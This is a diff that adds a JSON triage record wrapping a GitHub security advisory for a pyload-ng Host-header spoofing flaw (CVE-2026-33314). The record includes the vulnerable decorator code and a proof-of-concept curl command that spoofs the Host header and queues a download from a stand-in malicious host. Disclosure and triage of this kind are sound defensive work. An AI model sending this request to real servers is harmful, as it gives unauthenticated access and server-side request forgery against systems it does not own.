@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/26265990?v=4\", \"events_url\": \"https://api.github.com/users/Jaynornj/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Jaynornj/followers\", \"following_url\": \"https://api.github.com/users/Jaynornj/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Jaynornj/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Jaynornj\", \"id\": 26265990, \"login\": \"Jaynornj\", \"node_id\": \"MDQ6VXNlcjI2MjY1OTkw\", \"organizations_url\": \"https://api.github.com/users/Jaynornj/orgs\", \"received_events_url\": \"https://api.github.com/users/Jaynornj/received_events\", \"repos_url\": \"https://api.github.com/users/Jaynornj/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Jaynornj/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Jaynornj/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Jaynornj\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/144633680?v=4\", \"events_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/followers\", \"following_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Pr00fOf3xpl0it\", \"id\": 144633680, \"login\": \"Pr00fOf3xpl0it\", \"node_id\": \"U_kgDOCJ7vUA\", \"organizations_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/orgs\", \"received_events_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/received_events\", \"repos_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Pr00fOf3xpl0it/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Pr00fOf3xpl0it\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-33314\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}, {\"cwe_id\": \"CWE-346\", \"name\": \"Origin Validation Error\"}], \"description\": \"### Summary\\n\\nA Host Header Spoofing vulnerability in the `@local_check` decorator allows unauthenticated external attackers to bypass local-only restrictions. This grants access to the Click'N'Load API endpoints, enabling attackers to remotely queue arbitrary downloads, leading to Server-Side Request Forgery (SSRF) and Denial of Service (DoS).\\n\\n### Details\\n\\nThe `pyload` WebUI provides an API for the Click'N'Load plugin, which is intended to be accessed only from the local machine (e.g., via a browser extension sending requests to `localhost:9666`). To enforce this, the `pyload` application uses a `@local_check` decorator on the relevant routes in `src/pyload/webui/app/blueprints/cnl_blueprint.py`.\\n\\nHowever, the `@local_check` implementation relies on the user-controlled `HTTP_HOST` (derived from the HTTP `Host` header) to verify the origin:\\n\\n```python\\n# src/pyload/webui/app/blueprints/cnl_blueprint.py\\ndef local_check(func):\\n    @wraps(func)\\n    def wrapper(*args, **kwargs):\\n        remote_addr = flask.request.environ.get(\\\"REMOTE_ADDR\\\", \\\"0\\\")\\n        http_host = flask.request.environ.get(\\\"HTTP_HOST\\\", \\\"0\\\")\\n\\n        if remote_addr in (\\\"127.0.0.1\\\", \\\"::ffff:127.0.0.1\\\", \\\"::1\\\", \\\"localhost\\\") or http_host in (\\n                \\\"127.0.0.1:9666\\\",\\n                \\\"[::1]:9666\\\",\\n        ):\\n            return func(*args, **kwargs)\\n        else:\\n            return \\\"Forbidden\\\", 403\\n    return wrapper\\n```\\n\\nBecause `http_host` is read directly from the `Host` header of the HTTP request, an external attacker can easily spoof this header (e.g., `Host: 127.0.0.1:9666`). When this spoofed header is present, the condition `http_host in (\\\"127.0.0.1:9666\\\", ...)` evaluates to `True`, completely bypassing the IP address check (`remote_addr`) and granting access to the protected functions.\\n\\nThe affected routes are:\\n\\n- `/flash/` and `/flash/<id>`\\n- `/flash/add`\\n- `/flash/addcrypted`\\n- `/flash/addcrypted2`\\n- `/flashgot` and `/flashgot_pyload`\\n- `/flash/checkSupportForUrl`\\n\\n### PoC\\n\\n1. Ensure the PyLoad instance is running and accessible externally.\\n2. Ensure the `ClickNLoad` plugin is enabled in the PyLoad settings (it evaluates to disabled by default).\\n3. Send a POST request to one of the protected endpoints, such as `/flash/add`, and spoof the `Host` header to `127.0.0.1:9666`.\\n\\nExample `curl` command:\\n\\n```bash\\ncurl -i -X POST \\\"http://<pyload-external-ip>:<port>/flash/add\\\" \\\\\\n     -H \\\"Host: 127.0.0.1:9666\\\" \\\\\\n     -d \\\"urls=http://malicious.com/payload.bin\\\" \\\\\\n     -d \\\"package=MaliciousPackage\\\"\\n```\\n\\n4. Notice that you receive a `success\\\\r\\\\n` response instead of a `403 Forbidden`. The package and URL will be successfully added to the PyLoad queue.\\n\\n### Impact\\n\\nThis vulnerability allows unauthenticated attackers to interact with the Click'N'Load API. Attackers can arbitrarily add URLs to the download queue, which forces the PyLoad server to make outbound requests to attacker-controlled or internal URLs (SSRF). Attackers can also exhaust the server's storage or bandwidth by queueing massive files (DoS).\", \"epss\": {\"percentage\": 0.00183, \"percentile\": 0.0799}, \"ghsa_id\": \"GHSA-q485-cg9q-xq2r\", \"github_reviewed_at\": \"2026-03-19T17:55:53Z\", \"html_url\": \"https://github.com/advisories/GHSA-q485-cg9q-xq2r\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-q485-cg9q-xq2r\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-33314\"}], \"nvd_published_at\": \"2026-03-24T20:16:27Z\", \"published_at\": \"2026-03-19T17:55:53Z\", \"references\": [\"https://github.com/pyload/pyload/security/advisories/GHSA-q485-cg9q-xq2r\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-33314\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-122.yaml\", \"https://github.com/advisories/GHSA-q485-cg9q-xq2r\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-q485-cg9q-xq2r\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/pyload/pyload\", \"summary\": \"Improper Authentication and Origin Validation Error in pyload-ng\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T19:07:15Z\", \"url\": \"https://api.github.com/advisories/GHSA-q485-cg9q-xq2r\", \"vulnerabilities\": [{\"first_patched_version\": \"0.5.0b3.dev97\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyload-ng\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.5.0b3.dev96\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-q485-cg9q-xq2r",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyload-ng: <= 0.5.0b3.dev96"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-33314"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyload-ng"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.411511Z",
+  "provenance": {
+    "content_sha256": "e8cd40bcc24e48ff4dd84690d46717320dbd0deed1530fd20fcc7561611af22b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-19T17:55:53Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-q485-cg9q-xq2r",
+  "status": "active",
+  "title": "Improper Authentication and Origin Validation Error in pyload-ng",
+  "updated_at": "2026-06-08T19:07:15Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-q485-cg9q-xq2r"
+}
